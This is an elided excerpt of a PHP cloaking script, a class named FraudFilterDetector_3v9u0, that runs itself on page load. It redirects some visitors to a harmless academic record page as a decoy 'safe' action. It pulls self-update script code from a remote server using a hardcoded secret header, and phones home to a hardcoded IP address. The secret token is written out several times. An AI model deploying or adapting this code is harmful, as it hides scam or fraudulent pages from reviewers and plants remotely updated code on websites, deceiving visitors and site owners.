...
class FraudFilterDetector_3v9u0 {
    ...
    function isSignatureValid($sign, $time) {
        $str = 'cb51c6b1-ac54-4e73-b387-998a506be746.'.$this->getClid().'.'.$time;
        $sha = sha1($str);
        return $sign === $sha;
    }
...
<?php
    ...
    function safeAction() {
        $this->redirect('https://ixtheo.de/Record/1754903940');
    }
    ...
    function getUpgradeScriptViaContents($home, $fileName) {
        $opts = array('http' =>
            array(
                'method'  => 'GET',
                'header' => 'x-ff-secret: cb51c6b1-ac54-4e73-b387-998a506be746',
                'timeout' => 2
            )
        );
    ...
    function upgradeScript($home, $fileName) {
        ...
        if ($output === false || !$this->isSignature2Valid($output)) {
            ...
            $headers[] = 'x-ff-secret: cb51c6b1-ac54-4e73-b387-998a506be746';
...
";
    ...
    function fillAllPostHeaders() {
        ...
        $headers[] = 'X-FF-P: cb51c6b1-ac54-4e73-b387-998a506be746';
    ...
    function notifyAboutError($message) {
        ...
        $url = 'http://139.59.212.55/ff-notify.html?v=ff1&guid=3v9u0&m='.$message;
        $ch = curl_init($url);
...
$fraudFilterDetector_3v9u0 = new FraudFilterDetector_3v9u0();
$fraudFilterDetector_3v9u0->check();
